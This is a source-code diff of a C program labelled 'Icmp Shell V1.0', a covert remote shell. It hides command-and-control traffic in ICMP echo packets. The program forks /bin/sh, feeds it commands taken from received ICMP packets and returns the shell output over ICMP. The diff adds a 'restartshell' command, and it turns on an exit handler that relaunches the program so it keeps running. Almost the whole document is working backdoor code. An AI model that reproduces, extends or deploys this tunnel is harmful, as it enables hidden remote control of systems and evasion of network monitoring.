@@ -21,10 +21,10 @@ linux --zip--> windows
 |               |
 +--zip--0x842B--+
 
-2013.4.27 
+2013.4.27
 todo:
-    spilt lage data into mutil packet 
-    when sh exit  restart shell 
+    spilt lage data into mutil packet
+    when sh exit  restart shell
 */
 #include "icmp_shell.h"
 #include "buffer.h"
@@ -37,7 +37,7 @@ typedef unsigned char uint8;
         printf(fmt,__VA_ARGS__); \
     }while(0);
 
-//#define IN_BUF_SIZE   1024  //接收数据的缓冲区的大小 
+//#define IN_BUF_SIZE   1024  //接收数据的缓冲区的大小
 #define MAX_BUFF_SIZE  1000 // max data size can send 
 #define SLEEP_TIME 1000 // interval of send echo request packet 
 
@@ -45,7 +45,7 @@ typedef unsigned char uint8;
 enum PACKET_TYPE
 {
     TYPE_REQUEST = 0x2B,
-    TYPE_REPLY 
+    TYPE_REPLY
 };
 
 
@@ -63,12 +63,17 @@ uint32 g_RemoteIp = 0;// 远程 ip
 char *g_Cmd = NULL; //要执行的命令
 char *g_Request = NULL;//请求的数据吧
 char *g_password = "sincoder"; //通信的密码
-char *g_hello_msg = "\x2BIcmp Shell V1.0 \nBy: sincoder \n";
+int  g_child_pid = 0;// pid of sh
+char *g_hello_msg = "\x2BIcmp Shell V1.0 \n\
+By: sincoder \n\
+command:\n\
+\trestartshell\n";
 uint32 g_bind_ip = 0;
 //char g_output_buffer[MAX_BUFF_SIZE] = {0};  //缓存要发送的数据
 pthread_mutex_t g_output_mutex;
-
 buffer_context g_output_buffer = {0};
+
+void icmp_append_send_buffer(char *data, int size);
 
 void MySleep(uint32 msec)
 {
@@ -185,7 +190,7 @@ int  icmp_sendrequest(int icmp_sock, uint32 ip, uint8 *pdata, uint32 size)
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = ip;
 
-    icmp->checksum = 0x00; 
+    icmp->checksum = 0x00;
     icmp->checksum = checksum((unsigned short *) icmp, sizeof(struct icmphdr) + size);
 
     // send reply
@@ -215,6 +220,162 @@ void set_fd_noblock(int fd)
     fcntl(fd, F_SETFL, flags);
 }
 
+void  icmpshell_sendrequest(uint32 ip)
+{
+    int len = 0;
+    char buff[513];
+    buff[0] = TYPE_REQUEST;
+    pthread_mutex_lock(&g_output_mutex);
+    len = buffer_read(&g_output_buffer, &buff[1], 512);
+    icmp_sendrequest(g_icmp_sock, ip, &buff[0], len + 1);
+    pthread_mutex_unlock(&g_output_mutex);
+}
+
+
+int is_visual_char(unsigned char ch)
+{
+    switch (ch)
+    {
+    case 'A':
+    case 'B':
+    case 'C':
+    case 'D':
+    case 'E':
+    case 'F':
+    case 'G':
+    case 'H':
+    case 'I':
+    case 'J':
+    case 'K':
+    case 'L':
+    case 'M':
+    case 'N':
+    case 'O':
+    case 'P':
+    case 'Q':
+    case 'R':
+    case 'S':
+    case 'T':
+    case 'U':
+    case 'V':
+    case 'W':
+    case 'X':
+    case 'Y':
+    case 'Z':
+    case 'a':
+    case 'b':
+    case 'c':
+    case 'd':
+    case 'e':
+    case 'f':
+    case 'g':
+    case 'h':
+    case 'i':
+    case 'j':
+    case 'k':
+    case 'l':
+    case 'm':
+    case 'n':
+    case 'o':
+    case 'p':
+    case 'q':
+    case 'r':
+    case 's':
+    case 't':
+    case 'u':
+    case 'v':
+    case 'w':
+    case 'x':
+    case 'y':
+    case 'z':
+    case '~':
+    case '!':
+    case '@':
+    case '#':
+    case '$':
+    case '%':
+    case '^':
+    case '&':
+    case '*':
+    case '(':
+    case ')':
+    case '_':
+    case '+':
+    case '`':
+    case '1':
+    case '2':
+    case '3':
+    case '4':
+    case '5':
+    case '6':
+    case '7':
+    case '8':
+    case '9':
+    case '0':
+    case '-':
+    case '=':
+    case '{':
+    case '}':
+    case '[':
+    case ']':
+    case ':':
+    case '"':
+    case '|':
+    case ';':
+    case '\'':
+    case '\\':
+    case '<':
+    case ',':
+    case '>':
+    case '.':
+    case '?':
+    case '/':
+    case ' ':
+    {
+        return 1;
+    }
+    default:
+        break;
+    }
+    return 0;
+}
+
+int icmpshell_process_command(char *cmd)
+{
+    char *ch = cmd;
+    int len = 0;
+    while (1)
+    {
+        ++len;
+        if (0 == is_visual_char(*ch))
+        {
+            *ch = '\n';
+            break;
+        }
+        ++ch;
+    }
+    //if(len < 1) // empty command 
+    //    return 1;
+    dbg_msg("%s: cmd: %s ",__func__,cmd);
+    if (0 == strncasecmp(cmd, "restartshell", len))
+    {
+        dbg_msg("%s : try kill shell ! \n",__func__);
+        // restart me
+        if (-1 == kill(g_child_pid, 9))
+        {
+            // failed kill
+            char *err_msg = "\nfailed to kill shell \n";
+            icmp_append_send_buffer(err_msg,strlen(err_msg));
+        }
+    }
+    else if (-1 == write(write_pipe[1], cmd, len ))
+    {
+        dbg_msg("%s:write failed !! \n", __func__);
+        return 0;
+    }
+    return 1;
+}
+
 /*
 接收命令的线程
 */
@@ -236,7 +397,7 @@ void *Icmp_RecvThread(void *lparam)
         {
             // get ip and icmp header and data part
             ip = (struct iphdr *) in_buf;
-            dbg_msg("%s: recv a icmp packet from %s \n",__func__,iptos(ip->saddr));
+            dbg_msg("%s: recv a icmp packet from %s \n", __func__, iptos(ip->saddr));
             if (nbytes > sizeof(struct iphdr) && ip->saddr !=  inet_addr("127.0.0.1"))  //过滤掉本地 ip 的
             {
                 int iplen = ip->ihl * sizeof(unsigned int);
@@ -261,30 +422,17 @@ void *Icmp_RecvThread(void *lparam)
                                 char *data = (char *)(phdr + 1);
 
                                 dbg_msg("%s: msg type reply !! \n", __func__);
-                                dbg_msg("%s : recv %d bytes : %s \n",__func__,nbytes,data);
-                                if (nbytes > 1)
+                                dbg_msg("%s : recv %d bytes : %s \n", __func__, nbytes, data);
+                                if (nbytes >= 0)
                                 {
-                                    int len = 0;
                                     data[nbytes] = '\0';
-                                    //dbg_msg("%s:icmp recv %s  \n", __func__, data);
-                                    // 写到 shell 里面
-                                    len = strlen(data);
-                                    data[len] = '\n';  //发来的命令 里面 应该 不能含有 \n
-                                    if(-1 == write(write_pipe[1], data, len + 1))
+                                    if (icmpshell_process_command(data))
                                     {
-                                        dbg_msg("%s:write failed !! \n",__func__);
-                                        break;
+                                        //我们也要马上 发回一个 request 来看看 有木有数据了 此时要延时的
+                                        MySleep(SLEEP_TIME);
+                                        icmpshell_sendrequest(ip->saddr);
                                     }
-                                    //fflush(stdout);
                                 }
-                                //我们也要马上 发回一个 request 来看看 有木有数据了 此时要延时的
-                                MySleep(SLEEP_TIME);
-                                pthread_mutex_lock(&g_output_mutex);
-                                ((struct packet_header *)request_buff)->type = TYPE_REQUEST;
-                                strcpy((char *)((char *)request_buff + sizeof(struct packet_header)),g_output_buffer);
-                                icmp_sendrequest(g_icmp_sock, ip->saddr, &request_buff[0], strlen(g_output_buffer) + sizeof(struct packet_header));
-                                g_output_buffer[0] = 0;
-                                pthread_mutex_unlock(&g_output_mutex);
                             }
                             break;
                             case TYPE_REQUEST:
@@ -304,10 +452,10 @@ void *Icmp_RecvThread(void *lparam)
                         else if (8 == icmp->type)
                         {
                             char *data = (char *)(icmp + 1);
-                            if(TYPE_REQUEST == data[0])
+                            if (TYPE_REQUEST == data[0])
                             {
                                 dbg_msg("%s: recv a icmp request from %s \n", __func__, iptos(ip->saddr));
-                                
+
                                 icmp_sendrequest(g_icmp_sock, ip->saddr, (uint8 *)g_hello_msg, strlen(g_hello_msg)); //
                             }
                         }
@@ -326,10 +474,18 @@ void *Icmp_RecvThread(void *lparam)
     return NULL;
 }
 
+void icmp_append_send_buffer(char *data, int size)
+{
+    //把读到的数据放到全局的缓冲区中
+    pthread_mutex_lock(&g_output_mutex);
+    buffer_write(&g_output_buffer, data, size);
+    pthread_mutex_unlock(&g_output_mutex);
+}
+
 /*
 从管道中读取数据（命令执行的结果）并发送出去
 */
-void *ShellPipe_ReadThread(void *lparam)
+static void *ShellPipe_ReadThread(void *lparam)
 {
     unsigned char buff[1024];
     int nBytes = 0;
@@ -339,10 +495,7 @@ void *ShellPipe_ReadThread(void *lparam)
     {
         buff[nBytes] = 0;
         dbg_msg("%s: recv %d bytes from pipe: %s \n", __func__, nBytes, buff);
-        //把读到的数据放到全局的缓冲区中
-        pthread_mutex_lock(&g_output_mutex);
-        buffer_write(&g_output_buffer,&buff[0],nBytes);
-        pthread_mutex_unlock(&g_output_mutex);
+        icmp_append_send_buffer( &buff[0], nBytes);
     }
     dbg_msg("%s: thread exit ... \n", __func__);
     return NULL;
@@ -360,18 +513,18 @@ void *ShellPipe_ReadThread(void *lparam)
 /*
 退出的时候重新启动进程
 */
-void OnExit()
+static void OnExit()
 {
     dbg_msg("%s:exiting 。。、\n", __func__);
-    dbg_msg("%s : try restart shell  !! \n",__func__);
+    dbg_msg("%s : try restart shell  !! \n", __func__);
     sleep(1);
     if (g_MyName)
         system(g_MyName); //重新启动进程
     else
-        dbg_msg("%s:xxxxxx \n",__func__);
+        dbg_msg("%s:xxxxxx \n", __func__);
 }
 
-uint32_t get_local_ip (uint32_t ip)
+static uint32_t get_local_ip (uint32_t ip)
 {
     char buffer[100];
     int sock = socket ( AF_INET, SOCK_DGRAM, 0);
@@ -403,7 +556,7 @@ int main(int argc, char **argv)
 {
     int pid;
     g_MyName = argv[0]; //保存下
-    //atexit(OnExit);
+    atexit(OnExit);
     // create raw ICMP socket
     g_icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (g_icmp_sock == -1)
@@ -418,13 +571,13 @@ int main(int argc, char **argv)
     pipe(read_pipe);
     pipe(write_pipe);
 
-    pid = fork();
+    g_child_pid = fork();
 
-    if (0 == pid)
+    if (0 == g_child_pid)
     {
         //进入子进程
         //启动 shell 进程
-        close(g_icmp_sock); // child do not need 
+        close(g_icmp_sock); // child do not need
         close(read_pipe[0]);
         close(write_pipe[1]);
         char *argv[] = {"/bin/sh", NULL};
@@ -440,9 +593,8 @@ int main(int argc, char **argv)
         pthread_t hShellRead;
         close(read_pipe[1]);
         close(write_pipe[0]);
-
         buffer_init(&g_output_buffer);
-        dbg_msg("child process id %d \n", pid);
+        dbg_msg("child process id %d \n", g_child_pid);
         pthread_mutex_init(&g_output_mutex, NULL);
         //启动一个线程来读取
         hIcmpRecv = MyCreateThread(Icmp_RecvThread, NULL);
@@ -451,16 +603,17 @@ int main(int argc, char **argv)
         {
             dbg_msg("%s:Create Thread exit ... \n", __func__);
         }
-        waitpid(pid, NULL, 0); //等待子进程退出
+        waitpid(g_child_pid, NULL, 0); //等待子进程退出
         dbg_msg("%s:child exit. ..\n", __func__);
         //write(g_icmp_sock,"sincoder",8);
-        icmp_sendrequest(g_icmp_sock,inet_addr("127.0.0.1"),"sincoder",8);
+        icmp_sendrequest(g_icmp_sock, inet_addr("127.0.0.1"), "sincoder", 8);
         close(g_icmp_sock); //tell the icmp_recv thread exit ...
         close(read_pipe[0]);
         close(write_pipe[1]);
-        dbg_msg("%s:wait thread exit ...\n",__func__);
+        dbg_msg("%s:wait thread exit ...\n", __func__);
         pthread_join(hIcmpRecv, NULL); //线程会因为上面的句柄关闭 而退出
         pthread_join(hShellRead, NULL);
+        buffer_free(&g_output_buffer);
     }
     return 0;
 }
